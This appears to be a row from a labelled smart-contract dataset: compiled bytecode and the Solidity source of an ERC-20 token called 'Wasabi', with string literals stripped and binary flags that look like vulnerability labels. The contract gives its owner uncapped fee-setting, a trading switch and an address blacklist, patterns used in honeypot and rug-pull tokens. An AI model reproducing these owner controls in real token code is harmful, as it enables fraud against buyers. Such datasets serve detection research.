8110612c5157612c51613190565b60200260200101906001600160a01b031690816001600160a01b031681525050612c9c307f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d84611a3a565b60405163791ac94760e01b81526001600160a01b037f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d169063791ac94790612cf19085906000908690309042906004016131c3565b600060405180830381600087803b158015612d0b57600080fd5b505af1158015612d1f573d6000803e3d6000fd5b505050505050565b612d52307f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d84611a3a565b60405163f305d71960e01b815230600482015260248101839052600060448201819052606482015261dead60848201524260a48201527f0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d6001600160a01b03169063f305d71990839060c40160606040518083038185885af1158015612ddc573d6000803e3d6000fd5b50505050506040513d601f19601f82011682018060405250810190612e019190613234565b5050505050565b600060208083528351808285015260005b81811015612e3557858101830151858201604001528201612e19565b506000604082860101526040601f19601f8301168501019250505092915050565b6001600160a01b0381168114612e6b57600080fd5b50565b600060208284031215612e8057600080fd5b8135611a3381612e56565b60008060408385031215612e9e57600080fd5b8235612ea981612e56565b946020939093013593505050565b600060208284031215612ec957600080fd5b5035919050565b600080600060608486031215612ee557600080fd5b8335612ef081612e56565b92506020840135612f0081612e56565b929592945050506040919091013590565b803580151581146118aa57600080fd5b600080600060608486031215612f3657600080fd5b8335925060208401359150612f4d60408501612f11565b90509250925092565b60008060408385031215612f6957600080fd5b8235612f7481612e56565b9150612f8260208401612f11565b90509250929050565b600080600060608486031215612fa057600080fd5b505081359360208301359350604090920135919050565b600060208284031215612fc957600080fd5b611a3382612f11565b60008060408385031215612fe557600080fd5b8235612ff081612e56565b9150602083013561300081612e56565b809150509250929050565b600181811c9082168061301f57607f821691505b60208210810361303f57634e487b7160e01b600052602260045260246000fd5b50919050565b6020808252818101527f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572604082015260600190565b634e487b7160e01b600052601160045260246000fd5b8082028115828204841417610c6357610c6361307a565b6000826130c457634e487b7160e01b600052601260045260246000fd5b500490565b80820180821115610c6357610c6361307a565b6000602082840312156130ee57600080fd5b5051919050565b60208082526025908201527f45524332303a207472616e736665722066726f6d20746865207a65726f206164604082015264647265737360d81b606082015260800190565b60208082526023908201527f45524332303a207472616e7366657220746f20746865207a65726f206164647260408201526265737360e81b606082015260800190565b81810381811115610c6357610c6361307a565b634e487b7160e01b600052603260045260246000fd5b6000602082840312156131b857600080fd5b8151611a3381612e56565b600060a082018783526020878185015260a0604085015281875180845260c086019150828901935060005b818110156132135784516001600160a01b0316835293830193918301916001016131ee565b50506001600160a01b03969096166060850152505050608001529392505050565b60008060006060848603121561324957600080fd5b835192506020840151915060408401519050925092509256fe45524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa2646970667358221220cc9d305ff42fc483f1c268eba063a0287941083121153e48b3c7f2ca2ce66fe664736f6c63430008120033,0,0,0,0,0,0,0,1,0,1,0,0,1,1,1,0,0
"pragma solidity ^0.8.9;abstract contract Context { function _msgSender() internal view virtual returns (address) { return msg.sender; }}interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 amount) external returns (bool); function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval( address indexed owner, address indexed spender, uint256 value );}contract Ownable is Context { address private _owner; address private _previousOwner; event OwnershipTransferred( address indexed previousOwner, address indexed newOwner ); constructor() { address msgSender = _msgSender(); _owner = msgSender; emit OwnershipTransferred(address(0), msgSender); } function owner() public view returns (address) { return _owner; } modifier onlyOwner() { require(_owner == _msgSender(), ); _; } function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred(_owner, address(0)); _owner = address(0); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), ); emit OwnershipTransferred(_owner, newOwner); _owner = newOwner; }}library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; require(c >= a, ); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { return sub(a, b, ); } function sub( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b <= a, errorMessage); uint256 c = a - b; return c; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b, ); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return div(a, b, ); } function div( uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) { require(b > 0, errorMessage); uint256 c = a / b; return c; }}interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair);}interface IUniswapV2Router02 { function swapExactTokensForETHSupportingFeeOnTransferTokens( uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline ) external; function factory() external pure returns (address); function WETH() external pure returns (address); function addLiquidityETH( address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline ) external payable returns ( uint256 amountToken, uint256 amountETH, uint256 liquidity );}contract Wasabi is Context, IERC20, Ownable { using SafeMath for uint256; string private constant _name = ; string private constant _symbol = ; uint8 private constant _decimals = 9; mapping(address => uint256) private _rOwned; mapping(address => uint256) private _tOwned; mapping(address => mapping(address => uint256)) private _allowances; mapping(address => bool) private _isExcludedFromFee; uint256 private constant MAX = ~uint256(0); uint256 private constant _tTotal = 1000000000 * 10**9; uint256 private _rTotal = (MAX - (MAX % _tTotal)); uint256 private _tFeeTotal; uint256 private _redisFeeOnBuy = 0; uint256 private _taxFeeOnBuy = 25; uint256 private _redisFeeOnSell = 0; uint256 private _taxFeeOnSell = 25; uint256 private _redisFee = _redisFeeOnSell; uint256 private _taxFee = _taxFeeOnSell; uint256 private _previousredisFee = _redisFee; uint256 private _previoustaxFee = _taxFee; mapping(address => bool) public bots; mapping (address => uint256) public _buyMap; address payable private _developmentAddress = payable(0xC862e4F729CF86A7E8fF8CAA2E39845c37a0fBe5); address payable private _marketingAddress = payable(0xC862e4F729CF86A7E8fF8CAA2E39845c37a0fBe5); IUniswapV2Router02 public uniswapV2Router; address public uniswapV2Pair; bool private tradingOpen = true; bool private inSwap = false; bool private swapEnabled = true; uint256 public _maxTxAmount = _tTotal * 2 / 100; uint256 public _maxWalletSize = _tTotal * 2 / 100; uint256 public _swapTokensAtAmount = _tTotal * 3 / 1000; event MaxTxAmountUpdated(uint256 _maxTxAmount); modifier lockTheSwap { inSwap = true; _; inSwap = false; } constructor() { _rOwned[_msgSender()] = _rTotal; IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); uniswapV2Router = _uniswapV2Router; uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()) .createPair(address(this), _uniswapV2Router.WETH()); _isExcludedFromFee[owner()] = true; _isExcludedFromFee[address(this)] = true; _isExcludedFromFee[_developmentAddress] = true; _isExcludedFromFee[_marketingAddress] = true; emit Transfer(address(0), _msgSender(), _tTotal); } function name() public pure returns (string memory) { return _name; } function symbol() public pure returns (string memory) { return _symbol; } function decimals() public pure returns (uint8) { return _decimals; } function totalSupply() public pure override returns (uint256) { return _tTotal; } function balanceOf(address account) public view override returns (uint256) { return tokenFromReflection(_rOwned[account]); } function transfer(address recipient, uint256 amount) public override returns (bool) { _transfer(_msgSender(), recipient, amount); return true; } function allowance(address owner, address spender) public view override returns (uint256) { return _allowances[owner][spender]; } function approve(address spender, uint256 amount) public override returns (bool) { _approve(_msgSender(), spender, amount); return true; } function transferFrom( address sender, address recipient, uint256 amount ) public override returns (bool) { _transfer(sender, recipient, amount); _approve( sender, _msgSender(), _allowances[sender][_msgSender()].sub( amount, ) ); return true; } function tokenFromReflection(uint256 rAmount) private view returns (uint256) { require( rAmount <= _rTotal, ); uint256 currentRate = _getRate(); return rAmount.div(currentRate); } function removeAllFee() private { if (_redisFee == 0 && _taxFee == 0) return; _previousredisFee = _redisFee; _previoustaxFee = _taxFee; _redisFee = 0; _taxFee = 0; } function restoreAllFee() private { _redisFee = _previousredisFee; _taxFee = _previoustaxFee; } function _approve( address owner, address spender, uint256 amount ) private { require(owner != address(0), ); require(spender != address(0), ); _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); } function _transfer( address from, address to, uint256 amount ) private { require(from != address(0), ); require(to != address(0), ); require(amount > 0, ); if (from != owner() && to != owner()) { if (!tradingOpen) { require(from == owner(), ); } require(amount <= _maxTxAmount, ); require(!bots[from] && !bots[to], ); if(to != uniswapV2Pair) { require(balanceOf(to) + amount < _maxWalletSize, ); } uint256 contractTokenBalance = balanceOf(address(this)); bool canSwap = contractTokenBalance >= _swapTokensAtAmount; if(contractTokenBalance >= _maxTxAmount) { contractTokenBalance = _maxTxAmount; } if (canSwap && !inSwap && from != uniswapV2Pair && swapEnabled && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) { swapTokensForEth(contractTokenBalance); uint256 contractETHBalance = address(this).balance; if (contractETHBalance > 0) { sendETHToFee(address(this).balance); } } } bool takeFee = true; if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) { takeFee = false; } else { if(from == uniswapV2Pair && to != address(uniswapV2Router)) { _redisFee = _redisFeeOnBuy; _taxFee = _taxFeeOnBuy; } if (to == uniswapV2Pair && from != address(uniswapV2Router)) { _redisFee = _redisFeeOnSell; _taxFee = _taxFeeOnSell; } } _tokenTransfer(from, to, amount, takeFee); } function swapTokensForEth(uint256 tokenAmount) private lockTheSwap { address[] memory path = new address[](2); path[0] = address(this); path[1] = uniswapV2Router.WETH(); _approve(address(this), address(uniswapV2Router), tokenAmount); uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens( tokenAmount, 0, path, address(this), block.timestamp ); } function sendETHToFee(uint256 amount) private { _marketingAddress.transfer(amount); } function setTrading(bool _tradingOpen) public onlyOwner { tradingOpen = _tradingOpen; } function manualswap() external { require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress); uint256 contractBalance = balanceOf(address(this)); swapTokensForEth(contractBalance); } function manualsend() external { require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress); uint256 contractETHBalance = address(this).balance; sendETHToFee(contractETHBalance); } function blockBots(address[] memory bots_) public onlyOwner { for (uint256 i = 0; i < bots_.length; i++) { bots[bots_[i]] = true; } } function unblockBot(address notbot) public onlyOwner { bots[notbot] = false; } function _tokenTransfer( address sender, address recipient, uint256 amount, bool takeFee ) private { if (!takeFee) removeAllFee(); _transferStandard(sender, recipient, amount); if (!takeFee) restoreAllFee(); } function _transferStandard( address sender, address recipient, uint256 tAmount ) private { ( uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tTeam ) = _getValues(tAmount); _rOwned[sender] = _rOwned[sender].sub(rAmount); _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount); _takeTeam(tTeam); _reflectFee(rFee, tFee); emit Transfer(sender, recipient, tTransferAmount); } function _takeTeam(uint256 tTeam) private { uint256 currentRate = _getRate(); uint256 rTeam = tTeam.mul(currentRate); _rOwned[address(this)] = _rOwned[address(this)].add(rTeam); } function _reflectFee(uint256 rFee, uint256 tFee) private { _rTotal = _rTotal.sub(rFee); _tFeeTotal = _tFeeTotal.add(tFee); } receive() external payable {} function _getValues(uint256 tAmount) private view returns ( uint256, uint256, uint256, uint256, uint256, uint256 ) { (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _redisFee, _taxFee); uint256 currentRate = _getRate(); (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, currentRate); return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam); } function _getTValues( uint256 tAmount, uint256 redisFee, uint256 taxFee ) private pure returns ( uint256, uint256, uint256 ) { uint256 tFee = tAmount.mul(redisFee).div(100); uint256 tTeam = tAmount.mul(taxFee).div(100); uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam); return (tTransferAmount, tFee, tTeam); } function _getRValues( uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate ) private pure returns ( uint256, uint256, uint256 ) { uint256 rAmount = tAmount.mul(currentRate); uint256 rFee = tFee.mul(currentRate); uint256 rTeam = tTeam.mul(currentRate); uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam); return (rAmount, rTransferAmount, rFee); } function _getRate() private view returns (uint256) { (uint256 rSupply, uint256 tSupply) = _getCurrentSupply(); return rSupply.div(tSupply); } function _getCurrentSupply() private view returns (uint256, uint256) { uint256 rSupply = _rTotal; uint256 tSupply = _tTotal; if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal); return (rSupply, tSupply); } function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner { _redisFeeOnBuy = redisFeeOnBuy; _redisFeeOnSell = redisFeeOnSell; _taxFeeOnBuy = taxFeeOnBuy; _taxFeeOnSell = taxFeeOnSell; } function setMinSwapTokensThreshold(uint256 swapTokensAtAmount) public onlyOwner { _swapTokensAtAmount = _tTotal * swapTokensAtAmount / 1000; } function toggleSwap(bool _swapEnabled) public onlyOwner { swapEnabled = _swapEnabled; } function setMaxTxnAmount(uint256 maxTxAmount) public onlyOwner { _maxTxAmount = _tTotal * maxTxAmount / 1000; } function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner { _maxWalletSize = _tTotal * maxWalletSize / 1000; } function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner { for(uint256 i = 0; i < accounts.length; i++) { _isExcludedFromFee[accounts[i]] = excluded; } }}",0x6080604052600436106101d05760003560e01c80637d1db4a5116100f7578063a2a957bb11610095578063c492f04611610064578063c492f0461461065c578063dd62ed3e14610685578063ea1644d5146106c2578063f2fde38b146106eb576101d7565b8063a2a957bb146105a2578063a9059cbb146105cb578063bfd7928414610608578063c3c8cd8014610645576101d7565b80638f70ccf7116100d15780638f70ccf7146104fa5780638f9a55c01461052357806395d89b411461054e57806398a5c31514610579576101d7565b80637d1db4a5146104675780637f2feddc146104925780638da5cb5b146104cf576101d7565b8063313ce5671161016f5780636fc3eaec1161013e5780636fc3eaec146103d357806370a08231146103ea578063715018a61461042757806374010ece1461043e576101d7565b8063313ce5671461032b57806349bd5a5e146103565780636b999053146103815780636d8aa8f8146103aa576101d7565b80631694505e116101ab5780631694505e1461026d57806318160ddd1461029857806323b872dd146102c35780632fd689e314610300576101d7565b8062b8cf2a146101dc57806306fdde0314610205578063095ea7b314610230576101d7565b366101d757005b600080fd5b3480156101e857600080fd5b5061020360048036038101906101fe9190612dcc565b610714565b005b34801561021157600080fd5b5061021a61083e565b6040516102279190612e9d565b60405180910390f35b34801561023c57600080fd5b5061025760048036038101906102529190612ef5565b61087b565b6040516102649190612f50565b60405180910390f35b34801561027957600080fd5b50610282610899565b60405161028f9190612fca565b60405180910390f35b3480156102a457600080fd5b506102ad6108bf565b6040516102ba9190612ff4565b60405180910390f35b3480156102cf57600080fd5b506102ea60048036038101906102e5919061300f565b6108cf565b6040516102f79190612f50565b60405180910390f35b34801561030c57600080fd5b506103156109a8565b6040516103229190612ff4565b60405180910390f35b34801561033757600080fd5b506103406109ae565b60405161034d919061307e565b60405180910390f35b34801561036257600080fd5b5061036b6109b7565b60405161037891906130a8565b60405180910390f35b34801561038d57600080fd5b506103a860048036038101906103a391906130c3565b6109dd565b005b3480156103b657600080fd5b506103d160048036038101906103cc919061311c565b610acd565b005b3480156103df57600080fd5b506103e8610b7f565b005b3480156103f657600080fd5b50610411600480360381019061040c91906130c3565b610c50565b60405161041e9190612ff4565b60405180910390f35b34801561043357600080fd5b5061043c610ca1565b005b34801561044a57600080fd5b5061046560048036038101906104609190613149565b610df4565b005b34801561047357600080fd5b5061047c610eb3565b6040516104899190612ff4565b60405180910390f35b34801561049e57600080fd5b506104b960048036038101906104b491906130c3565b610eb9565b6040516104c69190612ff4565b60405180910390f35b3480156104db57600080fd5b506104e4610ed1565b6040516104f191906130a8565b60405180910390f35b34801561050657600080fd5b50610521600480360381019061051c919061311c565b610efa565b005b34801561052f57600080fd5b50610538610fac565b6040516105459190612ff4565b60405180910390f35b34801561055a57600080fd5b50610563610fb2565b6040516105709190612e9d565b60405180910390f35b34801561058557600080fd5b506105a0600480360381019061059b9190613149565b610fef565b005b3480156105ae57600080fd5b506105c960048036038101906105c49190613176565b6110ae565b005b3480156105d757600080fd5b506105f260048036038101906105ed9190612ef5565b611165565b6040516105ff9190612f50565b60405180910390f35b34801561061457600080fd5b5061062f600480360381019061062a91906130c3565b611183565b60405161063c9190612f50565b60405180910390f35b34801561065157600080fd5b5061065a6111a3565b005b34801561066857600080fd5b50610683600480360381019061067e9190613238565b61127c565b005b34801561069157600080fd5b506106ac60048036038101906106a79190613298565b6113b6565b6040516106b99190612ff4565b60405180910390f35b3480156106ce57600080fd5b506106e960048036038101906106e49190613149565b61143d565b005b3480156106f757600080fd5b50610712600480360381019061070d91906130c3565b6114fc565b005b61071c6116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146107a9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107a090613324565b60405180910390fd5b60005b815181101561083a576001601060008484815181106107ce576107cd613344565b5b602002602001015173ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055508080610832906133a2565b9150506107ac565b5050565b60606040518060400160405280600e81526020017f57617361736869204d7573616269000000000000000000000000000000000000815250905090565b600061088f6108886116be565b84846116c6565b6001905092915050565b601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000670de0b6b3a7640000905090565b60006108dc848484611891565b61099d846108e86116be565b61099885604051806060016040528060288152602001613de360289139600460008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061094e6116be565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546121169092919063ffffffff16565b6116c6565b600190509392505050565b60185481565b60006009905090565b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6109e56116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610a72576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610a6990613324565b60405180910390fd5b6000601060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555050565b610ad56116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610b62576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b5990613324565b60405180910390fd5b80601560166101000a81548160ff02191690831515021790555050565b601260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16610bc06116be565b73ffffffffffffffffffffffffffffffffffffffff161480610c365750601360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16610c1e6116be565b73ffffffffffffffffffffffffffffffffffffffff16145b610c3f57600080fd5b6000479050610c4d8161217a565b50565b6000610c9a600260008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546121e6565b9050919050565b610ca96116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610d36576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d2d90613324565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a360008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b610dfc6116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610e89576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e8090613324565b60405180910390fd5b6103e881670de0b6b3a7640000610ea091906133eb565b610eaa9190613474565b60168190555050565b60165481565b60116020528060005260406000206000915090505481565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b610f026116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614610f8f576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610f8690613324565b60405180910390fd5b80601560146101000a81548160ff02191690831515021790555050565b60175481565b60606040518060400160405280600681526020017f5761736162690000000000000000000000000000000000000000000000000000815250905090565b610ff76116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614611084576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161107b90613324565b60405180910390fd5b6103e881670de0b6b3a764000061109b91906133eb565b6110a59190613474565b60188190555050565b6110b66116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614611143576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161113a90613324565b60405180910390fd5b8360088190555082600a819055508160098190555080600b8190555050505050565b60006111796111726116be565b8484611891565b6001905092915050565b60106020528060005260406000206000915054906101000a900460ff1681565b601260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166111e46116be565b73ffffffffffffffffffffffffffffffffffffffff16148061125a5750601360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166112426116be565b73ffffffffffffffffffffffffffffffffffffffff16145b61126357600080fd5b600061126e30610c50565b905061127981612254565b50565b6112846116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614611311576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161130890613324565b60405180910390fd5b60005b838390508110156113b057816005600086868581811061133757611336613344565b5b905060200201602081019061134c91906130c3565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555080806113a8906133a2565b915050611314565b50505050565b6000600460008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b6114456116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146114d2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016114c990613324565b60405180910390fd5b6103e881670de0b6b3a76400006114e991906133eb565b6114f39190613474565b60178190555050565b6115046116be565b73ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614611591576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161158890613324565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415611601576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016115f890613517565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415611736576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161172d906135a9565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156117a6576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161179d9061363b565b60405180910390fd5b80600460008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040516118849190612ff4565b60405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415611901576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016118f8906136cd565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415611971576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016119689061375f565b60405180910390fd5b600081116119b4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016119ab906137f1565b60405180910390fd5b6119bc610ed1565b73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614158015611a2a57506119fa610ed1565b73ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614155b15611e1557601560149054906101000a900460ff16611ab957611a4b610ed1565b73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614611ab8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611aaf90613883565b60405180910390fd5b5b601654811115611afe576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611af5906138ef565b60405180910390fd5b601060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16158015611ba25750601060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b611be1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611bd890613981565b60405180910390fd5b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614611c8e5760175481611c4384610c50565b611c4d91906139a1565b10611c8d576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611c8490613a69565b60405180910390fd5b5b6000611c9930610c50565b9050600060185482101590506016548210611cb45760165491505b808015611ccc575060158054906101000a900460ff16155b8015611d265750601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff1614155b8015611d3e5750601560169054906101000a900460ff165b8015611d945750600560008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b8015611dea5750600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16155b15611e1257611df882612254565b60004790506000811115611e1057611e0f4761217a565b5b505b50505b600060019050600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1680611ebc5750600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff165b80611f6f5750601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614158015611f6e5750601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614155b5b15611f7d5760009050612104565b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff161480156120285750601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614155b1561204057600854600c81905550600954600d819055505b601560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161480156120eb5750601460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1614155b1561210357600a54600c81905550600b54600d819055505b5b612110848484846124da565b50505050565b600083831115829061215e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016121559190612e9d565b60405180910390fd5b506000838561216d9190613a89565b9050809150509392505050565b601360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc82908115029060